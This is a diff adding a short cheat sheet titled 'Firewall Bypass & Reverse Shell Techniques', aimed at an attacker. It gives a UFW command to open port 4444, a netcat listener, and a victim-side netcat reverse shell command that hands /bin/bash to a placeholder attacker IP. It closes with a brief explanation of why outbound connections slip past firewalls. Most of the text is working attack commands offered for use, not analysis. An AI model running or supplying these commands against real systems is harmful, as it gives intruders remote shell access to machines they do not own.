@@ -1,0 +1,25 @@
+==========================================================
+      FIREWALL BYPASS & REVERSE SHELL TECHNIQUES
+==========================================================
+
+1. PUNCHING THE HOLE (UFW)
+If your attack is blocked, you must tell the Linux 
+firewall (UFW) to allow the port:
+   - Command: sudo ufw allow 4444/tcp
+   - Check:   sudo ufw status
+
+2. THE REVERSE SHELL (THE BYPASS)
+Instead of the Attacker connecting to the Victim, 
+the Victim connects to the Attacker.
+
+STEP A (Attacker waits): 
+   nc -lvp 4444
+
+STEP B (Victim connects OUT): 
+   nc [Attacker_IP] 4444 -e /bin/bash
+
+3. WHY IT WORKS
+Firewalls are like "Hotel Doors." They are locked from 
+the outside (Incoming), but you can open them from 
+the inside (Outgoing) without a key.
+==========================================================
